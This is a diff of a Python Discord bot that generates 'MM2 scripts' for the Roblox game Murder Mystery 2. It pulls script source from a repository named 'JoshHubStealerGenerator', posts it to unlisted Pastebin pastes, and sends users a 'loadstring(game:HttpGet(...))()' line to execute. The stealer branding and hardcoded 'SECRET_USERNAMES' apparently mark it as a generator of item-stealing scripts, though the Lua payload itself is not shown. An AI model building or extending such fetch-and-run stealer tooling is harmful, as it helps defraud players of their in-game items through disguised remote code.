@@ -1,7 +1,6 @@
 import discord
 from discord import app_commands
 from discord.ui import Modal, TextInput
-import urllib.parse
 import os
 import requests
 
@@ -12,37 +11,45 @@ tree = app_commands.CommandTree(bot)
 
 # Configuration
 SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
-RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
 PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
+RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubStealerGenerator/refs/heads/main/mm2sourcebyjoshhub.txt"
 
 def create_pastebin(content):
     """Create a paste on Pastebin"""
     try:
         if not PASTEBIN_API_KEY:
-            print("❌ No Pastebin API key!")
+            print("❌ No Pastebin API key in Secrets!")
             return None, None
-            
+        
         data = {
             'api_dev_key': PASTEBIN_API_KEY,
             'api_option': 'paste',
             'api_paste_code': content,
-            'api_paste_private': '1',
+            'api_paste_private': '1',  # Unlisted
             'api_paste_expire_date': '1D',
             'api_paste_name': 'MM2 Script'
         }
         
         response = requests.post('https://pastebin.com/api/api_post.php', data=data)
         
-        if response.status_code == 200:
+        print("="*50)
+        print(f"[DEBUG] Pastebin response status: {response.status_code}")
+        print(f"[DEBUG] Pastebin response text: {response.text}")
+        print("="*50)
+        
+        if response.status_code == 200 and 'pastebin.com/' in response.text:
             paste_url = response.text.strip()
-            if 'pastebin.com/' in paste_url:
-                paste_id = paste_url.split('/')[-1]
-                raw_url = f"https://pastebin.com/raw/{paste_id}"
-                print(f"✅ Pastebin created: {paste_url}")
-                return paste_url, raw_url
-        return None, None
-    except:
+            paste_id = paste_url.split('/')[-1]
+            raw_url = f"https://pastebin.com/raw/{paste_id}"
+            print(f"✅ Pastebin created: {paste_url}")
+            print(f"[DEBUG] Raw URL: {raw_url}")
+            return paste_url, raw_url
+        else:
+            print("❌ Pastebin creation failed!")
+            return None, None
+    except Exception as e:
+        print(f"❌ Pastebin error: {str(e)}")
         return None, None
 
 class ScriptModal(Modal, title="MM2 Script Generator"):
@@ -89,34 +96,38 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
         paste_url, raw_url = create_pastebin(script_content)
         
         if paste_url and raw_url:
-            # CORRECT LOADSTRING FOR USER
+            # FULL LOADSTRING FOR USER
             final_loadstring = f'loadstring(game:HttpGet("{raw_url}"))()'
             
             # DEBUG OUTPUT
             print("="*50)
             print(f"[DEBUG] paste_url = {paste_url}")
             print(f"[DEBUG] raw_url = {raw_url}")
-            print(f"[DEBUG] final_loadstring = {final_loadstring}")
+            print(f"[DEBUG] final_loadstring sent to user = {final_loadstring}")
             print("="*50)
             
-            # FIXED: Send correct loadstring
+            # Send full loadstring
             try:
                 await interaction.user.send(
                     f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
                     f"Copy and execute this:\n"
-                    f"```lua\n{final_loadstring}\n```"  # CORRECT LINE
+                    f"```lua\n{final_loadstring}\n```"
                 )
                 await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
             except:
                 await interaction.followup.send(
                     f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
                     f"Copy and execute this:\n"
-                    f"```lua\n{final_loadstring}\n```",  # CORRECT LINE
+                    f"```lua\n{final_loadstring}\n```",
                     ephemeral=True
                 )
         else:
             fallback = f'loadstring(game:HttpGet("{github_url}"))()'
-            await interaction.followup.send(f"**Direct:**\n```lua\n{fallback}\n```", ephemeral=True)
+            print(f"[DEBUG] Pastebin failed - using fallback: {fallback}")
+            await interaction.followup.send(
+                f"**Direct fallback:**\n```lua\n{fallback}\n```",
+                ephemeral=True
+            )
 
 @tree.command(name="generate-mm2", description="🎮 Generate MM2 script")
 async def generate_mm2(interaction: discord.Interaction):
@@ -128,8 +139,8 @@ async def on_ready():
     try:
         await tree.sync()
         print("🔄 Commands synced")
-    except:
-        print("⚠️ Sync issue")
+    except Exception as e:
+        print(f"⚠️ Sync issue: {str(e)}")
 
 if __name__ == "__main__":
     if not DISCORD_TOKEN:
